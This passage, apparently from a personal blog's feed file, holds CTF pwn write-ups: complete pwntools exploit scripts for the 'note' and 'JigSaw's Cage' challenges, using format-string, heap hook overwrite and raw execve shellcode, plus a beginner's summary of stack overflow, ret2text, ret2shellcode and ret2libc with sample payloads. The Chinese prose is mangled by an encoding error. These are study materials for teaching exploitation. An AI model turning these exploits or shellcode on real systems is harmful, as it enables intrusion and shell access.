class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;47.104.70.90&quot;,25315)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">con</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say ? &quot;</span>)</span><br><span class="line">p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x26</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">ad = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) + <span class="number">0x28</span></span><br><span class="line">log.info(<span class="string">&quot;ad: &quot;</span> + <span class="built_in">hex</span>(ad))</span><br><span class="line"></span><br><span class="line">say(<span class="string">&quot;%7$x&quot;</span>+<span class="string">&quot;bbbb&quot;</span>+p64(ad))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0xfd1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf</span>):</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;content:bbbbbbbb&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x108</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">og = libc_base + <span class="number">0x4527a</span><span class="comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;leak_addr: &quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook: &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">log.info(<span class="string">&quot;og: &quot;</span> + <span class="built_in">hex</span>(og))</span><br><span class="line">log.info(<span class="string">&quot;realloc: &quot;</span> + <span class="built_in">hex</span>(realloc))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">say(<span class="string">&quot;%7$s&quot;</span> + <span class="string">&quot;bbbb&quot;</span> + p64(malloc_hook-<span class="number">8</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">p.sendline(p64(og))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">say(<span class="string">&quot;%7$s&quot;</span> + <span class="string">&quot;bbbb&quot;</span> + p64(malloc_hook))</span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">p.sendline(p64(realloc+<span class="number">13</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;16&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="æ³•äºŒ">æ³•äºŒ</span></h2><p>åˆ©ç”¨ scanf æ ¼å¼åŒ– ç›´æ¥æ‰“stdout</p><p>åˆ©ç”¨stdoutæ³„éœ²å‡ºlibc</p><p>å†æ‰“åˆ©ç”¨ scanf æ¼æ´æ‰“exit_hook,ä»è€Œgetshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./note&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.104.70.90&#x27;</span>,<span class="number">25315</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(size)</span><br><span class="line">cmd(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">con</span>):</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;%13$s\x00\x00\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak - <span class="number">0x3c36e0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">sys_addr = libc_base + <span class="number">0x453a0</span></span><br><span class="line">_rtld_global = libc_base + <span class="number">0x5f0040</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xcd173</span>,<span class="number">0xcd248</span>,<span class="number">0xf03a4</span>,<span class="number">0xf03b0</span>,<span class="number">0xf1247</span>,<span class="number">0xf67f0</span>]</span><br><span class="line">og = libc_base + one[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;%7$s\x00\x00\x00\x00&quot;</span>+p64(_rtld_global+<span class="number">3848</span>))</span><br><span class="line">p.sendline(p64(og))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="jigsawscage">JigSawâ€™sCage</span></h1><p>scanfå¤„æœ‰æ¼æ´ï¼Œå®é™…è¯»å…¥äº† %ld çš„å†…å®¹ï¼Œä»è€Œå¯ä»¥è¦†ç›–æ‰v2</p><p>è¦†ç›–æ‰v2åï¼Œè®©v2&gt;14</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/xiangyunbei-wp/1635584852428781/6af8743f82efcdeda46ac9b27947bf6a641c3e66.png" alt="q"></p><p>å°±èƒ½åˆ©ç”¨mprotectå‡½æ•°ç»™å †åœ°å€åŠ æƒé™(7:rwx)</p><p>ç„¶åå†åœ¨å †ä¸­å†™å…¥shellcodeå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;47.104.71.220&#x27;,10273)</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line">p.sendafter(<span class="string">&quot;:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;hhhh&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100000000000</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sc1 = <span class="string">&quot;\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span>              *å¯ä»¥é€šè¿‡x/iæŸ¥çœ‹è¿™äº›æœºå™¨ç çš„æ„æ€</span><br><span class="line">sc2 = <span class="string">&quot;\xf7\xe6\x50\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span>     </span><br><span class="line">pay = sc1 + p8(<span class="number">0xe9</span>)+p8(<span class="number">0x11</span>)+p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">pay = pay.ljust(<span class="number">16</span>,<span class="string">&#x27;\xc3&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,pay)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,sc2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">gift(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¥¥äº‘æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤§æ€»ç»“</title>
      <link href="/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/"/>
      <url>/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1><span id="0x01-ncç›´æ¥è¿">0x01 ncç›´æ¥è¿</span></h1><p>å½“é¢˜ç›®ä¸­ç›´æ¥å‡ºç°äº†**â€/bin/shâ€<strong>ã€</strong>cat flag**æ—¶è¿è¡Œåncå³å¯</p><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ get_shell</em></strong></p><h1><span id="0x02-å˜é‡çš„è¦†ç›–">0x02 å˜é‡çš„è¦†ç›–</span></h1><p>1.ç®—å‡ºä¸¤å˜é‡åœ¨æ®µä¸­çš„å·®å€¼:</p><ul><li><p>â€‹     å¯ä»¥ç›´æ¥åœ¨payloadä¸­ç›´æ¥å†™ç®—å¼ã€â€™aâ€™*(0x6C-0x68)ã€‘</p></li><li><p>â€‹     ä¹Ÿå¯ä»¥ç”¨è®¡ç®—å™¨ç®—å‡ºç»“æœåå†å†™å…¥payloadã€â€™aâ€™*4ã€‘</p></li></ul><p>2.å†åŠ ä¸Šæƒ³è¾“å…¥çš„å€¼</p><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ hello_pwn</em></strong></p><p><img src="/images/zj5.png" alt="zj5"></p><p><img src="/images/zj6.png" alt="zj6"></p><p>å¯ä»¥çœ‹åˆ°unk_601068å…è®¸è¾“å…¥çš„é•¿åº¦æ˜¯10ï¼Œè€Œunk_601068å’Œdword_60106Cåœ¨.bssæ®µç›¸å·®4ï¼ˆ6c-68ï¼‰</p><p>äºæ˜¯å¯ä»¥æƒ³åˆ°åœ¨unk_601068ä¸­è¾“å…¥4ä¸ªæ•°è¦†ç›–æ‰dword_60106Cå†è¾“å…¥è‡ªå·±æƒ³è¦çš„å€¼</p><p>payload = â€˜aâ€™*4 + p64(1853186401)</p><h1><span id="0x03-æ ˆæº¢å‡º">0x03 æ ˆæº¢å‡º</span></h1><p>æ ˆæº¢å‡ºæ˜¯æŒ‡å‘æ ˆä¸­å†™å…¥äº†è¶…å‡ºé™å®šé•¿åº¦çš„æ•°æ®ï¼Œæº¢å‡ºçš„æ•°æ®ä¼šè¦†ç›–æ ˆä¸­å…¶å®ƒæ•°æ®ï¼Œä»è€Œå½±å“ç¨‹åºçš„è¿è¡Œã€‚</p><p><strong>å‰æï¼šstackæœªå¼€å¯</strong></p><p>ç®—å‡ºå˜é‡åˆ°retçš„é•¿åº¦ï¼Œå†å†™å…¥æƒ³è¾“å…¥çš„å€¼å³å¯</p><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ level0</em></strong></p><p><img src="/images/zj7.png" alt="zj7"></p><p><img src="/images/zj8.png" alt="zj8"></p><p><img src="/images/zj9.png" alt="zj9"></p><p><img src="/images/zj10.png" alt="zj10"></p><p>å¯ä»¥çœ‹å‡ºæ²¡æœ‰å¼€å¯æ ˆä¿æŠ¤ï¼Œ200è¿œå¤§äº80</p><p>ç›´æ¥æ ˆæº¢å‡ºå³å¯</p><p>payload = â€˜aâ€™*(0x80+0x08) + p64(0x040059A)</p><h1><span id="0x04-getsæº¢å‡ºæ¼æ´">0x04 gets()æº¢å‡ºæ¼æ´</span></h1><p>ä¾‹å¦‚ gets(s) , ä¸ç®¡ s  çš„ç©ºé—´æ˜¯å¦å¤Ÿç”¨ï¼Œgetså‡½æ•°ä¸€ç›´éƒ½ä¼šå¾€sé‡Œè¾“ä¸œè¥¿ï¼Œè¿™å°±å­˜åœ¨æº¢å‡ºé—®é¢˜</p><p>äºæ˜¯å¯ä»¥ç”¨gets()æº¢å‡ºæ¥è¾¾åˆ°ä¿®æ”¹æŸä¸ªå˜é‡çš„å€¼çš„æ•ˆæœ</p><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ when_did_you_born</em></strong></p><p><img src="/images/zj11.png" alt="zj11"></p><p>getså‡½æ•°çš„æ¼æ´ï¼Œåˆ©ç”¨v4è¦†ç›–æ‰v5çš„åœ°å€åæ”¹ä¸º1926å³å¯</p><p><img src="/images/zj12.png" alt="zj12"></p><h1><span id="0x05-rop">0x05 ROP</span></h1><p>ä¸€ç›´æŠŠæ ˆæº¢å‡ºçš„ä½œç”¨å½“æˆäº†ROPçš„ä½œç”¨ï¼Œåæ¥æ‰å‘ç°æ ˆæº¢å‡ºåªæ˜¯ROPé‡Œçš„ä¸€ä¸ªç¯èŠ‚</p><p>æ ˆæº¢å‡ºæ§åˆ¶ç‚¹ä¸€èˆ¬æ˜¯åœ¨retå¤„ï¼ŒROPçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯<strong>åˆ©ç”¨ä»¥retç»“å°¾çš„æŒ‡ä»¤åºåˆ—æŠŠæ ˆä¸­çš„åº”è¯¥è¿”å›EIPçš„åœ°å€æ›´æ”¹æˆæˆ‘ä»¬éœ€è¦çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹</strong></p><h2><span id="0x001-ret2text">0x001 ret2text</span></h2><p>ret2text åˆå¯ä»¥ç†è§£ä¸ºæ˜¯ret to textï¼Œé¡¾åæ€ä¹‰å°±æ˜¯<strong>å°†åº”è¯¥è¿”å›EIPçš„åœ°å€æ”¹æˆtextä¸­çš„æŸä¸ªåœ°å€</strong></p><p>ä¸Šé¢0x03æ ˆæº¢å‡ºæåˆ°çš„level0å°±æ˜¯ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œå°±ä¸èµ˜è¿°äº†</p><p>è®²è®²æ”»é˜²ä¸–ç•Œçš„level2ï¼š</p><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œlevel2</em></strong>ï¼ˆsystemå†…å¹¶æ²¡æœ‰å†™å…¥â€œ/bin/shâ€åœ°å€ï¼‰</p><p><img src="/images/zj13.png" alt="zj13"></p><p><img src="/images/zj14.png" alt="zj14"></p><p>è¿™åº”è¯¥æ˜¯å±äºret2textçš„ä¸€ç§å˜å¼ï¼Œå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡º</p><p>æŒ‰f12å‘ç°ç»™å‡ºäº†systemå’Œâ€/bin/shâ€ï¼Œä½†æ˜¯ç‚¹å¼€systemä¼šå‘ç°systemå†…å¹¶æ²¡æœ‰å†™å…¥â€œ/bin/shâ€</p><p><img src="/images/zj24.png" alt="zj24"></p><p>â€œ/bin/shâ€çš„åœ°å€è¢«å•ç‹¬ç»™å‡ºæ¥äº†</p><p><img src="/images/zj25.png" alt="zj25"></p><p>æ‰€ä»¥è¦åœ¨payloadä¸­å°†â€œ/bin/shâ€å†™å…¥system</p><p>system()å’Œâ€œ/bin/shâ€çš„åœ°å€æ€ä¹ˆæ‰¾å‘¢ï¼Ÿ</p><p>ä¸€ç§æ˜¯åœ¨IDAä¸­ç›´æ¥æ‰¾ï¼ˆä¹‹å‰å¤ªèœæ‰¾ä¸åˆ°ï¼Œå°¤å…¶æ˜¯æ‰¾systemï¼‰</p><p>ä¸€ç§æ˜¯åœ¨payloadä¸­é€šè¿‡å‡½æ•°æŸ¥æ‰¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å‰æï¼šelf &#x3D; ELFï¼ˆ&#39;level2&#39;ï¼‰</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br></pre></td></tr></table></figure><p>æœ€åçš„payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*(0x88+0x4) + p32(sys_addr) + &#39;aaaa&#39; + p32(sh_addr)# &#39;aaaa&#39;æ˜¯systemå‡½æ•°çš„è¿”å›åœ°å€</span><br></pre></td></tr></table></figure><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œcgpwn2</em></strong>ï¼ˆ æ²¡æœ‰/bin/shï¼‰</p><p>å¯å°†/bin/shå†™å…¥æœªåˆå§‹åŒ–å˜é‡                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         </p><h2><span id="0x002-ret2shellcode">0x002 ret2shellcode</span></h2><p><strong>å°†è¿”å›åœ°å€ï¼ˆEIPï¼‰è¦†ç›–åˆ°æˆ‘ä»¬æ’å…¥shellcodeçš„é¦–åœ°å€</strong></p><p><strong>å‰æï¼šNXæœªå¼€å¯</strong></p><p>å…ˆè®²è®²shellcodeçš„æ¦‚å¿µï¼šshellcode æŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸è§çš„åŠŸèƒ½ä¸»è¦æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„ shellã€‚è¯´ç™½äº†å°±æ˜¯ä¸€æ®µèƒ½å¾—åˆ°æƒé™çš„ç‹¬ç«‹ä»£ç </p><p>åˆ©ç”¨pwntoolsä¸­è‡ªå¸¦çš„shellcraftåŸºæœ¬å†™æ³•ï¼ˆåº”è¯¥å¯ä»¥å½“æ¨¡æ¿è®°ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å‰ç¼€ï¼šcontext(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;amd64&#39;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br></pre></td></tr></table></figure><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œstring</em></strong></p><p>è¯¦æƒ…è§å…¶ä»–åšå®¢</p><h2><span id="0x003-ret2libc">0x003 ret2libc</span></h2><p>å½“å¼€å¯äº†NXæ—¶ï¼Œæ•°æ®æ‰€åœ¨çš„å†…å­˜é¡µä¼šæ ‡è®°ä¸ºä¸å¯æ‰§è¡Œï¼Œæ­¤æ—¶å†æ‰§è¡Œshellcodeå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚æ—¢ç„¶æ³¨å…¥æ–°ä»£ç ä¸å¯è¡Œï¼Œé‚£ä¹ˆå°±å¤ç”¨ç¨‹åºä¸­å·²æœ‰çš„ä»£ç ã€‚è€Œlibc.soå‡ ä¹åœ¨æ¯ä¸ªç¨‹åºæ‰§è¡Œæ—¶éƒ½ä¼šåŠ è½½ï¼Œå°±å¯ä»¥åˆ©ç”¨libcä¸­çš„å‡½æ•°ã€‚ï¼ˆå½“ç„¶ .text ä¸­æœ¬èº«å°±æœ‰å¯ç”¨å‡½æ•°æ›´å¥½ , .textèµ°æŠ•æ— è·¯æ‰ä¼šæƒ³ç€ç”¨libcï¼‰</p><p>ret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ/bin/shâ€)ï¼Œæ•…è€Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚</p><p>å…·ä½“GOTã€PLTçŸ¥è¯†è§ï¼š<a href="https://linyt.blog.csdn.net/article/details/51635768">https://linyt.blog.csdn.net/article/details/51635768</a></p><p>æ•´ä¸ªçœ‹äº†ä¸ªå¤§æ¦‚ï¼Œä½†æ˜¯æœ‰äº›åœ°æ–¹è¿˜æ˜¯æœ‰ç‚¹æ‡µ</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 